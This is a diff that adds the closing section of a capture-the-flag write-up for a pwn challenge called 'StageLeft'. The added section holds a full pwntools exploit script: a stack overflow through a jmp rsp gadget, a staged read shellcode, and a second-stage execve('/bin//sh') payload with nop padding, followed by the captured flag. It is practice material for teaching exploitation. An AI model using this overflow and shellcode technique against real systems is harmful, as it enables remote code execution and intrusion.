@@ -961,11 +961,101 @@ At this point we can go on ahead by sending the second staged shellcode as a cal
 
 But that doesn't work!
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/931eb20a-5d1e-4554-a8f4-23ec5a5ec879)
-![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/270a3676-3056-459a-a24a-dc99f3b0bab4)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/06d5661b-e394-4ff8-854c-98059612facb)
+
+After I looked at the debugger I saw it was trying to execute a wrong instruction so I just added nop slides which fixed the issue
+
+Here's the second [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/stage-left/solve2.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('StageLeft')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *vuln+62
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    jmp_rsp = 0x0000000000401238 # jmp rsp; 
+    offset = 40
+
+    sc = asm("""
+        push rax
+        pop rdi
+        mov rsi, rsp
+        syscall
+        call rsi
+    """)
+
+    stg2 = asm("nop") * 5 + asm("""
+        xor esi, esi
+        mov rdi, 0x68732f2f6e69622f
+        mov [0x404030], rdi
+        mov rcx, rsp
+        mov rdi, 0x404030
+        mov rsi, 0x0
+        mov al, 0x3b
+        cdq
+        syscall
+    """) + asm("nop") * 0x20
+
+    payload = flat({
+        offset: [
+            jmp_rsp,
+            sc
+        ]
+    })
 
 
+    sleep(60)
+    io.sendline(payload)
+    io.sendline(stg2)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+    
+if __name__ == '__main__':
+    main()
+```
+
+Running it works!
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/396cb0ab-6ea1-49d4-aa32-256f44dcb28c)
 
 
+```
+Flag: jctf{Center_Of_Attention}
+```
 
 
 
